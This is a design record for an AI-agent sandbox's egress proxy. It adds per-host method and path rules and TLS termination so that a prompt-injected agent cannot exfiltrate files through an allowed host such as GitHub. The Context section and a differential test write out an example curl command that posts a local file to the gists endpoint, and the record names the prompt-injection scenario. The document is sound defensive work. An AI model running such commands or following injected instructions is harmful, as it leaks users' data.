# ADR-062: Method and path rules for allowed hosts, in `openmoat run` and the standalone proxy

Status: proposed · Date: 2026-11-06 · Builds on ADR-020 (egress proxy), ADR-027 and
ADR-044 (proxy sessions) and ADR-043 (TLS termination) · Follows up #247

## Context

An allowed host can receive data. The default policy allows `api.github.com` (`registries`),
so a prompt-injected agent that has read a file can send it out with
`curl -X POST https://api.github.com/gists -d @notes.txt`, or a script it wrote can, through
`openmoat proxy`, which decides each connection by host alone (POLICY.md §5.2: "a `fetch`
allow opens the host to every method through the proxy, including requests with a body").
This is ATT&CK T1567 (exfiltration over a web service) and THREAT_MODEL T12's residual
gap: "the proxy checks the host, not what is sent inside HTTPS".

What exists today:

- **Method and path rules exist, but only per brokered secret** (ADR-043,
  `openmoat-core/src/secret/route.rs`): `secrets[].allow` lists `METHOD /path` rules
  (literal, `*`, `**` segments; path read as the server reads it; `..`, `%2f`, `..;`,
  double encoding, method-override headers and `_method` refused). They decide only which
  requests may **receive that secret's value**; a request without the secret is not
  restricted by them.
- **They apply only where the proxy reads requests:** plain HTTP with `plain_http: true`,
  or HTTPS that `openmoat run`'s proxy terminates because a secret for that host says
  `tls: terminate`. A host with no such secret is relayed as an opaque tunnel, in
  `openmoat run` too.
- **The standalone `openmoat proxy` never terminates** (ADR-043 §Sessions): the host
  sandboxes (Claude Code's and Codex's, with `sandbox.proxy_port`) read their trust from
  settings written once for every session, so the CA cannot reach the commands. It warns at
  start-up for each `tls: terminate` host and relays.
- **Sessions:** both proxies know the agent session of each request (ADR-027, ADR-044),
  decide with its taint, and Claude Code's `SessionStart` hook already writes the session's
  proxy credential into `CLAUDE_ENV_FILE`.

So the gap has two halves: no way to restrict methods and paths of a host that has no
secret, and no termination at all in the standalone proxy.

## Decision

### 1. Request rules per host, not only per secret

A new optional top-level policy section, `requests:` (additive to schema v1):

```yaml
requests:
  - id: github-api
    host: api.github.com
    allow:
      - GET /**
      - HEAD /**
      - POST /repos/*/*/issues
      - POST /repos/*/*/pulls
    deny:
      - POST /gists
      - PATCH /gists/**
```

- Same rule syntax and matcher as ADR-043 (`secret/route.rs`, moved to
  `openmoat-core/src/route.rs` and shared), same refusals (path the server could read as
  another, method override), same limit of 64 rules per list.
- `deny` first, then `allow`; a request matching neither is refused when `allow` is
  non-empty, and passes when only `deny` is given. Deny is absolute (ADR-002): a secret's
  `allow` cannot reopen a request a host's `deny` names.
- A host listed here is **terminated whenever a session's request reaches it**, whether or
  not a secret names it; `tls: terminate` stays the per-secret switch for value injection.
- The host must also be allowed by `net`/`fetch`; `requests:` only narrows, never opens.
  `policy lint` rejects an entry whose host no allow rule reaches, a bare IP, and a host
  pattern with a glob (one entry, one DNS name, as the CA's name constraints need).
- Refusals are recorded with a new rule id, `proxy-request` (method and the rule that
  refused, never the path, as for `proxy-secret-route`).

### 2. TLS termination in the standalone proxy, for sessions that carry the CA

- **Delivery of trust:** where the standalone proxy issues a session credential through
  `CLAUDE_ENV_FILE` (ADR-044), the same `SessionStart` step also writes the CA's public
  certificate and a bundle (system roots + CA) to a session folder outside `~/.moat`
  (`$TMPDIR/moat-session-<id>-ca/`, owner-only, readable to the sandbox) and exports the
  variables `openmoat run` sets (ADR-043: `NODE_EXTRA_CA_CERTS`, `SSL_CERT_FILE`,
  `REQUESTS_CA_BUNDLE`, `PIP_CERT`, `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`,
  `CARGO_HTTP_CAINFO`). Only the certificate, never the key.
- **The credential says so:** the session user name gains a version (`v2.<host>.<expires>.
  <session>.t`) whose trailing `t` marks a session that received the trust files. The proxy
  terminates only for such a session; it never guesses.
- **A session without trust** (Codex, whose environment OpenMoat cannot set per session; a
  credential-less request under `proxy_serve_without_credential`) reaching a `requests:`
  host is handled by `requests_untrusted:` in the policy: `refuse` (default when the entry
  has a `deny` list: the rules cannot be held otherwise) or `relay` (today's behaviour,
  recorded with a note). Fail closed is the default, as AGENTS §1 asks.
- **CA:** the same person-only `openmoat proxy ca init`, its name constraints now covering
  the hosts of `requests:` entries as well as `tls: terminate` secrets; the lock pins both
  files as before; a host added later needs `ca init` again, and both proxies say so at
  start-up instead of relaying silently.

### 3. Session taint

After a secret read, taint today refuses the whole host at the proxy (the proxy cannot
prompt). On a terminated `requests:` host it instead allows only `GET`, `HEAD` and `OPTIONS`
**without a body** and refuses the rest with `session-taint`: reads from registries keep
working, writes stop. Hosts that are not terminated keep today's whole-host refusal.

### 4. Defaults

The default policy ships **no active `requests:` entry**: termination needs a CA only a
person can make. It ships a commented recipe, and `openmoat policy` gains a signed pack
(ADR-031) `exfil-endpoints` with `deny` lists for known write-to-public endpoints of hosts
the default policy allows: `api.github.com` (`POST /gists`, `PATCH /gists/**`,
`POST /gists/*/comments`), and the paste and upload endpoints of other common allowed hosts
as they are added. `openmoat status` notes when `sandbox.proxy_port` is set, the CA exists
and the pack is not installed.

### 5. Out of scope

- Request bodies: no content inspection beyond ADR-020's leak check. A write endpoint the
  rules allow (an issue comment) can still carry data; rules narrow, they do not close.
- GraphQL and RPC-style endpoints, where one path carries reads and writes
  (`POST /graphql`): an entry can only allow or deny the path as a whole.
- HTTP/2, kept refused in terminated tunnels (ADR-043); keep-alive stays one request per
  tunnel (ROADMAP "Later").
- Pinning clients, which fail the handshake and so fail closed (ADR-043).

## Consequences

- An allowed host is no longer all-or-nothing: a person can keep `api.github.com` for
  `git`, `gh` reads and PRs while denying gists, and a tainted session keeps read access.
- Termination in the standalone proxy costs a TLS handshake on each side per request (one
  request per tunnel); `guard latency` does not cover the proxy, so a proxy latency check
  is added to CI (§Tests). Leaves stay cached per host per day.
- The CA becomes trusted by Claude Code session commands outside `openmoat run`, through
  per-session environment only; no system or user trust store changes. Its name
  constraints keep it to the listed hosts. `kernel-self` already denies reading the key,
  and the session folder holds only public material.
- Codex sessions get `requests:` protection only inside `openmoat run`, or a refusal when
  `requests_untrusted: refuse`. THREAT_MODEL §5 says so.
- A new rule id (`proxy-request`) and a new credential version; the proxy keeps accepting
  `v1` credentials (no termination for them) for one release.

## Alternatives

- **Deny the host outright** (remove `api.github.com` from `registries`): breaks `gh`, git
  over HTTPS and the agents' own GitHub tools. Rejected as the only option; still what a
  strict policy can do today.
- **Path rules on the SNI/CONNECT line only:** CONNECT carries no path; without termination
  there is nothing to match.
- **A second, MITM-only proxy for the standalone case:** duplicates ADR-043's request loop
  and audit path. Rejected: one proxy, one loop.
- **Trusting the CA system-wide for the standalone proxy:** every process of the user would
  trust it, and a leaked key, even name-constrained, would reach browsers. Rejected.

## Tests and fixtures

- `openmoat-core`: matcher unit tests moved with `route.rs`; `requests:` schema tests
  (lint errors: glob host, IP host, host no allow reaches, >64 rules, `TRACE`).
- `openmoat-proxy`: request-rule decisions inside a terminated tunnel (`deny` wins over a
  secret's `allow`; unlisted request refused when `allow` is set; tainted session: `GET`
  passes, `POST` refused); `v2` credential with and without `t`; `requests_untrusted`
  refuse/relay; attack tests reusing ADR-043's path-confusion set.
- e2e (`proxy_session`, `proxy_ca`): `SessionStart` writes the trust files and variables
  only with a CA and `sandbox.proxy_port`; never the key; a symlinked session folder is
  refused.
- Differential (`tests/e2e/differential`): `curl -X POST …/gists` through Claude Code's
  sandbox with the standalone proxy is refused; `curl …/repos/x/y` passes.
- Conformance: none (the hook's decision does not change); MoatBench gets an
  "exfil to an allowed host" scenario.

## Docs

POLICY.md §2 (new section), §5.2 (methods are now visible for `requests:` hosts), §6;
SANDBOX.md (standalone proxy trust); THREAT_MODEL T12 and §5 (what remains: bodies,
GraphQL, Codex outside `run`); ARCHITECTURE §13; INSTALL "Teams"; CHANGELOG.

## Pull requests (each ≤ 500 lines)

Termination, certificate trust and client compatibility carry most of the risk, so the
work starts with a proof of concept that tests them where OpenMoat already terminates,
and the standalone half (5 and 6) starts only if it holds.

0. **Proof of concept, `openmoat run` only, behind an unlisted setting.** One `requests:`
   host (`api.github.com`, `deny: POST /gists`) on the existing ADR-043 path, with no new
   policy schema beyond that entry. It measures, on macOS and Linux: that `gh`, `git`
   over HTTPS, `curl`, Node's `fetch`, Python's `requests` and the agents' own clients
   accept the per-session CA or fail closed with a clear message; the latency added per
   request (median and p95); and that a refused request leaves an audit row and never
   reaches the host. Exit criteria: no client sends a request the rule denies, every
   failure is a refusal (none is a silent pass), and the p95 is within the `guard
   latency` budget. Results go into this ADR before step 1; if they fail, the standalone
   half is dropped and `requests:` stays `openmoat run` only.
1. `refactor(core)`: move `secret/route.rs` to `route.rs`, shared; no behaviour change.
2. `feat(policy)`: `requests:` schema, lint and docs; parsed but not yet enforced
   (`policy lint` notes "enforced from the next release").
3. `feat(proxy)`: enforce `requests:` in `openmoat run`'s terminating proxy, `proxy-request`
   rows; taint read-only rule (§3).
4. `feat(proxy)`: CA name constraints cover `requests:` hosts; `ca init` and start-up
   messages.
5. *(only if step 0 held)* `feat(proxy)`: `v2` session credentials with the trust mark; standalone proxy terminates
   for them; `requests_untrusted`.
6. *(only if step 0 held)* `feat(cli)`: `SessionStart` writes the per-session trust files and variables; e2e.
7. `policy`: the `exfil-endpoints` pack, `status` note, MoatBench scenario, THREAT_MODEL.
